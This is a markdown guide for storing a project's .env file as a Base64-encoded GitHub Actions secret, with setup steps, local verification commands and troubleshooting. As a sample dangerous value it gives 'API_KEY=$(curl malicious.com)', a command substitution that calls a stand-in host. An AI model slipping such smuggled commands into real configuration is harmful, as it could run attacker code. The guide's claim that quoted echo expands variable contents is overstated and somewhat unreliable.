# GitHub Secrets Setup Guide

## Phase 2: Migrating to Base64 Encoded Secrets

### Why Base64 Encoding?

**Security Issue with Plain `echo`:**
```bash
# ❌ OLD METHOD (Vulnerable to shell injection)
echo "$ENV_FILE" > .env
```

If your `.env` contains special characters like:
```
PASSWORD='my$ecret"value'
API_KEY=$(curl malicious.com)
```

The shell will interpret these, causing:
- **Shell injection attacks**
- **Variable expansion issues**
- **Multi-line content corruption**

**✅ NEW METHOD (Safe with Base64):**
```bash
echo "$ENV_FILE_BASE64" | base64 -d > .env
```

Base64 treats everything as binary data - no interpretation, no injection.

---

## Setup Instructions

### Step 1: Generate Base64 Secret

Run the helper script from your project root:

```bash
.github/scripts/encode-env.sh
```

This will output a Base64 string. **Copy it to your clipboard.**

### Step 2: Add to GitHub Secrets

1. Go to your repository on GitHub
2. Navigate to: **Settings** → **Secrets and variables** → **Actions**
3. Click **"New repository secret"**
4. Fill in:
   - **Name:** `ENV_FILE_BASE64`
   - **Value:** Paste the Base64 string from Step 1
5. Click **"Add secret"**

### Step 3: Verify & Cleanup

1. Push your updated workflow to trigger a deployment
2. Check the deployment logs to ensure `.env` is created correctly
3. **After successful verification:**
   - Delete the old `ENV_FILE` secret
   - Keep only `ENV_FILE_BASE64`

---

## Verification

### Test Base64 Encoding Locally

```bash
# Encode your .env
base64 -i .env > encoded.txt

# Decode and compare
base64 -d -i encoded.txt > decoded.env
diff .env decoded.env

# Should show no differences
```

### Check Server After Deployment

SSH into your server and verify:

```bash
cd ~/stock-analysis
head -n 3 .env  # Should show your env vars correctly
```

---

## Troubleshooting

### "invalid input" error during decode

**Cause:** Extra whitespace in the Base64 string

**Fix:** Ensure you copied the exact output without trailing newlines

### .env file empty or corrupted

**Cause:** Base64 string was truncated

**Fix:** Re-run the encode script and ensure you copy the **entire** output

---

## Security Best Practices

✅ **DO:**
- Use Base64 for all secret file content
- Rotate secrets regularly
- Use GitHub Environments for production secrets (allows approval workflows)

❌ **DON'T:**
- Store secrets in code or commit history
- Use plain `echo` for multi-line content
- Share the Base64 string outside of GitHub Secrets
